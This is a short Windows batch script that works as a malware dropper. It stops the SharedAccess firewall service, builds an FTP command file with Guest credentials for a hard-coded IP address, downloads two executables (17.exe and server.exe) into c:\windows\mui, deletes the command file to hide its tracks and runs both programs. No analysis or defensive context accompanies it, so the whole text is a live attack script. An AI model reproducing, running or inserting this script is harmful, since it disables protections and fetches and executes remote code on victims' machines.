@echo off

net stop sharedaccess
echo open 58.211.37.26 > z.y
echo Guest>>z.y
echo lin>>z.y
echo get 17.exe c:\windows\mui\17.exe  >> z.y
echo get server.exe c:\windows\mui\server.exe >> z.y
echo bye >> z.y
ftp -s:z.y
del z.y
c:\windows\mui\17.exe
c:\windows\mui\server.exe
